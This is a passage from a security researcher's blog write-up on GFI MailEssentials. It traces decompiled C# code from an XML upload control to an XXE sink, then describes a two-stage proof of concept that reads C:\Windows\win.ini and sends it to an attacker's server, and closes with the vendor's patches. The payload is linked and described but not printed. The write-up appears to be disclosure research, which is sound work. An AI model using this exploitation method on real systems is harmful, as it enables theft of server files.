			this.lblImportMessage.Text = this.StringsProvider1.GetString("/AttachmentCheckingAdd1_ascx.NoFile");
		}
	}
	// ...
```

`fuUlpload` is of type `System.Web.UI.WebControls.FileUpload` [9], somehow expected for an upload control with an import button.
The uploaded file name extensions should end with `.xml` [10]. At [11] the inputstream of the uploaded file request is read into a byte array
which then is written into a `System.IO.MemoryStream` object at [12]. Then at [13] our `ImportAntiPhisingKeywordList` method gets called with the content.

```csharp
public bool ImportAntiPhisingKeywordList(byte[] streamArray, string extension) // [14]
{
	this.WriteToLogFile("Import ImportAntiPhisingKeywordList");
	this.UpdateProgressStatus(ItemInProgress.AntiPhishingKeyword, ImportStatus.Progress, 0, 0);
	List<object> list = new List<object>();
	list.Add(streamArray); // [15]
	list.Add(extension);
	Thread thread = new Thread(new ParameterizedThreadStart(this.ImportAntiPhisingKeywordList)); // [16]
	thread.Start(list);
	return true;
}
```

We know that the `extension` method parameter is set to a fixed value of `xml` [14] (see also [13]). Then `streamArray` with our XML content
is added to a ``System.Collections.Generic.List`1`` with members of type `System.Object` [15].
Finally at [16], a new `System.Threading.Thread` is created, calling `MEC.Configuration.RemotingHelper::ImportAntiPhisingKeywordList(System.Object)` with `list` as parameter.

We reached our final method, containing the XXE sink described in the very beginning of this chapter.

```csharp
private void ImportAntiPhisingKeywordList(object objectThreadObjs)
{
	List<object> list = (List<object>)objectThreadObjs; // [17]
	byte[] array = (byte[])list[0]; // [18]
	string text = (string)list[1]; // [19]
	using (MemoryStream memoryStream = new MemoryStream(array)) // [20]
	{
		try
		{
			int num = 0;
			int num2 = 0;
			using (StreamReader streamReader = new StreamReader(memoryStream)) // [21]
			{
				using (OleDbConnection oleDbConnection = new OleDbConnection(this.GetMEConfigConnString()))
				{
					oleDbConnection.Open();
					string text2 = text.ToLowerInvariant();
					if (!(text2 == "xml")) // [22]
					{
						if (text2 == "txt")
						{
							while (!streamReader.EndOfStream)
							{
								string text3 = streamReader.ReadLine();
								if (text3 != null && text3.Length > 2)
								{
									bool flag = this.SavePhisingKeywordToDb(text3, oleDbConnection);
									if (flag)
									{
										num++;
										this.UpdateProgressStatus(ItemInProgress.AntiPhishingKeyword, ImportStatus.Progress, num, num2);
									}
									else
									{
										num2--;
									}
								}
							}
						}
					}
					else
					{
						string text4 = streamReader.ReadToEnd();
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.LoadXml(text4); // [23]
						// ...
```

Our `objectThreadObjs` is again "casted" into a `List<object>` [17]. The first entry [18] contains the XML itself, the second one [19] the file extension.
The XML content is put into a `System.IO.MemoryStream` [20] to be finally used in a `System.IO.StreamReader` object [21].
If you recall, our extension equals `xml` so the `if` case at [22] is *not* taken.
In the `else` branch we hit the XXE sink at [23] instead: our full chain from web user interface user control to XXE sink got traced back successfully.

But could XXE work here? What does the .NET Framework version of this GFI MailEssentials .NET Assembly say?

```
// C:\Program Files (x86)\GFI\MailEssentials\Backend\bin\MEC.Configuration.dll
// MEC.Configuration.dll

// Global type: <Module>
// Architecture: AnyCPU (64-bit preferred)
// Runtime: .NET Framework 4
// Timestamp: 62B091B8 (6/20/2022 8:26:48 AM)
```

Looks good to me: PoC time! I used my favorite .NET XXE payload from [this gist](https://gist.github.com/staaldraad/01415b990939494879b4).
As a two-stage payload, it fetches the file `ev.xml` from my attacker's machine then reading the referenced file `C:\Windows\win.ini` locally on server-side,
finally providing its content with a second HTTP request to the attacker machine again.

{:refdef: style="text-align: center;"}
![XXE File Read](/assets/images/mailessentials/gfiblog_xxefileread.png)
**See the full GIF video [here](/assets/images/mailessentials/gfiblog_xxefileread.gif)**
{: refdef}

# Conclusions

GFI MailEssentials provides a lot of interesting attack surface, especially regarding different technology stack components.
Unfortunately (for me), I didn't find any authentication bypass. But maybe someone else can do it. At least other authenticated
vulnerabilities exist which I didn't report, yet. If you find other vulnerabilities,
don't forget to reference my first insights into this target :-P.

I think we can conclude on the criticality of my findings that "Vulnerability II" could be chosen as the winner with at least a "PR:L" requirement (especially "sexy" in AD environments).
The other findings might become useful in special situtations but are mostly interesting in a technical sense and hopefully teach some more code audit methodology to my readers.

GFI released [a new version 21.8](https://gfi.ai/products-and-solutions/network-security-solutions/mailessentials/resources/documentation/product-releases) and they provided the patches to me in advance. Here is my summary:

* LPE via .NET Remoting fixed for the script kiddie case. They implemented a restrictive `System.Runtime.Serialization.SerializationBinder` which doesn't appear too restrictive from my perspective (:-P). A nice little playground for you.
* They deleted the need for `BinaryFormatter` in the remote web call. Seems fine to me.
* The XXE sinks were modified by setting each object's `System.Xml.XmlResolver` to `null`. Also good, at least for these sinks.

Cheers!
